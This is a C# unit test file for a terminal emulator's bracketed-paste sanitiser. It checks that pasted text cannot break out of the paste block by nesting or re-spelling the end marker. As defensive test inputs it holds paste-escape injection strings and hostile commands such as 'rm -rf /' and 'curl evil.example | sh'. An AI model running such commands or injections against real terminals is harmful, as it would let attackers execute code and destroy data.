using Ntilde.Shell;
using System;
using System.Collections.Generic;
using Moq;
using Xunit;
using Ntilde.Platform;
using Ntilde.VT;
using Ntilde.Platform.Input;
using Ntilde.Pty;

namespace Ntilde.Tests.Input
{
    public class TerminalInputSenderTests
    {
        private const string PasteStart = "\u001b[200~";
        private const string PasteEnd = "\u001b[201~";

        [Fact]
        public void SendBracketedPaste_WrapsContentInEscapeSequences()
        {
            // Arrange
            var mockSession = new Mock<ITerminalSession>();
            string? sentPayload = null;

            mockSession.Setup(s => s.SendInput(It.IsAny<string>()))
                       .Callback<string>(s => sentPayload = s);

            string content = "Hello World\nLine 2";

            // Act
            TerminalInputSender.SendBracketedPaste(mockSession.Object, content);

            // Assert
            mockSession.Verify(s => s.SendInput(It.IsAny<string>()), Times.Once);
            Assert.Equal("\x1b[200~Hello World\nLine 2\x1b[201~", sentPayload);
        }

        [Fact]
        public void SendBracketedPaste_RemovesMaliciousEndSequences()
        {
            // Arrange
            var mockSession = new Mock<ITerminalSession>();
            string? sentPayload = null;

            mockSession.Setup(s => s.SendInput(It.IsAny<string>()))
                       .Callback<string>(s => sentPayload = s);

            // Content tries to close the paste block early
            string maliciousContent = "echo 'hijacked'\x1b[201~\nrm -rf /";

            // Act
            TerminalInputSender.SendBracketedPaste(mockSession.Object, maliciousContent);

            // Assert
            mockSession.Verify(s => s.SendInput(It.IsAny<string>()), Times.Once);

            // The interior ESC is stripped, so what is left of the terminator is the inert
            // text "[201~" and the paste block can only end at the real terminator.
            Assert.Equal("\x1b[200~echo 'hijacked'[201~\nrm -rf /\x1b[201~", sentPayload);
        }

        [Fact]
        public void PreparePaste_WhenBracketedPasteDisabled_NormalizesLineEndingsWithoutWrapping()
        {
            string prepared = TerminalInputSender.PreparePaste("line 1\r\nline 2", bracketedPasteModeEnabled: false);

            Assert.Equal("line 1\rline 2", prepared);
        }

        [Fact]
        public void PreparePaste_WhenBracketedPasteEnabled_NormalizesAndWraps()
        {
            string prepared = TerminalInputSender.PreparePaste("line 1\r\nline 2", bracketedPasteModeEnabled: true);

            Assert.Equal("\x1b[200~line 1\rline 2\x1b[201~", prepared);
        }

        [Fact]
        public void PreparePaste_WhenTerminatorIsNested_PasteCannotEndEarly()
        {
            // Removing the terminator's spelling once turns "ESC[20" + "ESC[201~" + "1~" back
            // into "ESC[201~", which would end the paste before "curl ..." and run it as typed.
            string prepared = TerminalInputSender.PreparePaste(
                "echo safe\u001b[20\u001b[201~1~\rcurl evil.example | sh",
                bracketedPasteModeEnabled: true);

            Assert.Equal(PasteStart + "echo safe[20[201~1~\rcurl evil.example | sh" + PasteEnd, prepared);
        }

        [Fact]
        public void PreparePaste_WhenTerminatorIsDoublyNested_PasteCannotEndEarly()
        {
            // Needs three rounds of terminator removal to reach a fixed point, so it also
            // catches a fix that only repeats the removal a fixed number of times.
            string prepared = TerminalInputSender.PreparePaste(
                "a\u001b[20\u001b[20\u001b[201~1~1~b",
                bracketedPasteModeEnabled: true);

            Assert.Equal(PasteStart + "a[20[20[201~1~1~b" + PasteEnd, prepared);
        }

        [Fact]
        public void PreparePaste_WhenContentHasC1CsiTerminator_StripsIt()
        {
            // U+009B is the single-character (8-bit C1) form of "ESC [", so "\u009B201~" is
            // another spelling of the terminator for a receiver that honours C1 controls.
            string prepared = TerminalInputSender.PreparePaste("a\u009b201~b", bracketedPasteModeEnabled: true);

            Assert.Equal(PasteStart + "a201~b" + PasteEnd, prepared);
        }

        [Fact]
        public void PreparePaste_WhenContentHasPlainTerminator_LeavesOnlyInertText()
        {
            string prepared = TerminalInputSender.PreparePaste("a\u001b[201~b", bracketedPasteModeEnabled: true);

            Assert.Equal(PasteStart + "a[201~b" + PasteEnd, prepared);
        }

        [Fact]
        public void PreparePaste_WhenContentHasNoEscapes_WrapsItUnchanged()
        {
            // "ћ" (Cyrillic tshe) is 0xD1 0x9B in UTF-8: sanitising removes the U+009B
            // code point, not every 0x9B byte, so ordinary non-ASCII text must survive intact.
            const string content = "git log --oneline | head -5\tcafé ћ ✓";

            string prepared = TerminalInputSender.PreparePaste(content, bracketedPasteModeEnabled: true);

            Assert.Equal(PasteStart + content + PasteEnd, prepared);
        }

        [Fact]
        public void PreparePaste_WhenStrippingExposesCrLf_StillNormalizesIt()
        {
            string prepared = TerminalInputSender.PreparePaste("a\r\u001b\nb", bracketedPasteModeEnabled: true);

            Assert.Equal(PasteStart + "a\rb" + PasteEnd, prepared);
        }

        [Theory]
        [InlineData("plain text")]
        [InlineData("x\u001b[201~y")]
        [InlineData("x\u001b[20\u001b[201~1~y")]
        [InlineData("x\u001b[20\u001b[20\u001b[201~1~1~y")]
        [InlineData("x\u009b201~y")]
        [InlineData("x\u001b[200~y\u001b[201~z")]
        [InlineData("\u001b\u001b\u009b\u009b")]
        [InlineData("x\u001b[201~\r\nrm -rf ~\r\n")]
        public void PreparePaste_WhenBracketed_MarkersAppearExactlyOnceAroundTheContent(string content)
        {
            string prepared = TerminalInputSender.PreparePaste(content, bracketedPasteModeEnabled: true);

            Assert.StartsWith(PasteStart, prepared);
            Assert.EndsWith(PasteEnd, prepared);

            // The only escape introducers left are the two that open the markers, so no
            // second start or end marker, in any spelling, can hide inside the content.
            string interior = prepared.Substring(PasteStart.Length, prepared.Length - PasteStart.Length - PasteEnd.Length);
            Assert.DoesNotContain('\u001b', interior);
            Assert.DoesNotContain('\u009b', interior);
        }

        [Fact]
        public void PreparePaste_WhenBracketedPasteDisabled_LeavesEscapesUntouched()
        {
            // Without bracketed paste the receiver cannot tell pasted text from typed text, so
            // there is no paste block for an escape to break out of; this path only normalizes.
            string prepared = TerminalInputSender.PreparePaste("a\u001b[201~b\u009b\r\nc", bracketedPasteModeEnabled: false);

            Assert.Equal("a\u001b[201~b\u009b\rc", prepared);
        }
    }
}
